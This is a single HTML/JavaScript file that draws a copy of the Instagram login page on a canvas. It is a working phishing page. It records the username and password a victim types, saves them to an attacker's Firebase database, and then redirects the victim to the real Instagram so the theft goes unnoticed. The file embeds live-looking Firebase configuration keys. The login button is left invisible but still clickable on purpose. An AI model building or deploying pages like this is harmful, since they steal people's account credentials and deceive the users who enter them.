<!DOCTYPE html>
<html>
<head>
  <title>Canvas Instagram Clone</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: #000;
    }
    canvas {
      display: block;
      cursor: default;
    }
  </style>
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
</head>
<body>
  <canvas id="canvas"></canvas>
  <script>
    // Your Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyD7egBqAFOkrAt4vCqYvsI80yM_jnG3taQ",
      authDomain: "idek-c694e.firebaseapp.com",
      projectId: "idek-c694e",
      storageBucket: "idek-c694e.firebasestorage.app",
      messagingSenderId: "912436644523",
      appId: "1:912436644523:web:d2f434d5ec1cbde846c5ee"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let bgImg = new Image();
    bgImg.src = 'insta_background.png'; // Your background image

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let input1 = '', input2 = '';
    let activeInput = null;

    // Input box coordinates (update to match your image)
    const input1Box = { x: 785, y: 210, w: 270, h: 28 };
    const input2Box = { x: 785, y: 255, w: 270, h: 28 };
    const buttonBox = { x: 785, y: 305, w: 270, h: 28 };

    // Slightly lighter background color for inputs
    const inputBgColor = '#121212';  // was #121212, now a bit lighter

    // For blinking cursor
    let showCursor = true;
    setInterval(() => {
      showCursor = !showCursor;
      draw();
    }, 500);

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(bgImg, 0, 0, canvas.width, canvas.height);

      ctx.font = '16px Arial';
      ctx.textBaseline = 'top';
      ctx.fillStyle = 'white';

      // Draw input background if clicked or if input has text
      if (input1Clicked || input1 !== '') {
        ctx.fillStyle = inputBgColor;
        ctx.fillRect(input1Box.x, input1Box.y, input1Box.w, input1Box.h);
      }
      if (input2Clicked || input2 !== '') {
        ctx.fillStyle = inputBgColor;
        ctx.fillRect(input2Box.x, input2Box.y, input2Box.w, input2Box.h);
      }

      // Draw input text
      ctx.fillStyle = 'white';
      ctx.fillText(input1, input1Box.x + 5, input1Box.y + 5);
      ctx.fillText('*'.repeat(input2.length), input2Box.x + 5, input2Box.y + 5);

      // Draw blinking cursor for active input
      if (activeInput === 'input1' && showCursor) {
        const textWidth = ctx.measureText(input1).width;
        ctx.fillRect(input1Box.x + 5 + textWidth, input1Box.y + 5, 2, 18);
      }
      if (activeInput === 'input2' && showCursor) {
        const starsWidth = ctx.measureText('*'.repeat(input2.length)).width;
        ctx.fillRect(input2Box.x + 5 + starsWidth, input2Box.y + 5, 2, 18);
      }

      // NO visible login button drawn here â€” button area is invisible but still clickable
    }

    bgImg.onload = draw;

    // Save login info to Firebase then redirect to Instagram
    function saveToFirebase(username, password) {
      const timestamp = Date.now();
      return database.ref('logins/' + timestamp).set({
        username: username,
        password: password,
        time: new Date(timestamp).toLocaleString()
      })
      .then(() => {
        window.location.href = 'https://www.instagram.com';
      });
    }

    // Track if inputs are clicked for drawing background
    let input1Clicked = false;
    let input2Clicked = false;

    canvas.addEventListener('mousedown', e => {
      const rect = canvas.getBoundingClientRect();
      const scaleX = canvas.width / rect.width;
      const scaleY = canvas.height / rect.height;
      const x = (e.clientX - rect.left) * scaleX;
      const y = (e.clientY - rect.top) * scaleY;

      if (x > input1Box.x && x < input1Box.x + input1Box.w && y > input1Box.y && y < input1Box.y + input1Box.h) {
        activeInput = 'input1';
        input1Clicked = true;
        input2Clicked = false;
        canvas.style.cursor = 'text';
      } else if (x > input2Box.x && x < input2Box.x + input2Box.w && y > input2Box.y && y < input2Box.y + input2Box.h) {
        activeInput = 'input2';
        input2Clicked = true;
        input1Clicked = false;
        canvas.style.cursor = 'text';
      } else if (x > buttonBox.x && x < buttonBox.x + buttonBox.w && y > buttonBox.y && y < buttonBox.y + buttonBox.h) {
        // Save to Firebase and redirect on click of invisible login button
        saveToFirebase(input1, input2).catch(error => {
          alert('Error saving data: ' + error);
        });
      } else {
        activeInput = null;
        input1Clicked = false;
        input2Clicked = false;
        canvas.style.cursor = 'default';
      }
      draw();
    });

    // Change cursor to pointer on hover over invisible login button area, text cursor on inputs, default otherwise
    canvas.addEventListener('mousemove', e => {
      const rect = canvas.getBoundingClientRect();
      const scaleX = canvas.width / rect.width;
      const scaleY = canvas.height / rect.height;
      const x = (e.clientX - rect.left) * scaleX;
      const y = (e.clientY - rect.top) * scaleY;

      if (
        (x > input1Box.x && x < input1Box.x + input1Box.w && y > input1Box.y && y < input1Box.y + input1Box.h) ||
        (x > input2Box.x && x < input2Box.x + input2Box.w && y > input2Box.y && y < input2Box.y + input2Box.h)
      ) {
        canvas.style.cursor = 'text';
      } else if (x > buttonBox.x && x < buttonBox.x + buttonBox.w && y > buttonBox.y && y < buttonBox.y + buttonBox.h) {
        canvas.style.cursor = 'pointer';
      } else {
        canvas.style.cursor = 'default';
      }
    });

    window.addEventListener('keydown', e => {
      if (!activeInput) return;

      if (e.key === 'Backspace') {
        if (activeInput === 'input1') input1 = input1.slice(0, -1);
        if (activeInput === 'input2') input2 = input2.slice(0, -1);
      } else if (e.key === 'Enter') {
        saveToFirebase(input1, input2).catch(error => {
          alert('Error saving data: ' + error);
        });
      } else if (e.key.length === 1) {
        if (activeInput === 'input1') input1 += e.key;
        if (activeInput === 'input2') input2 += e.key;
      }
      draw();
    });
  </script>
</body>
</html>
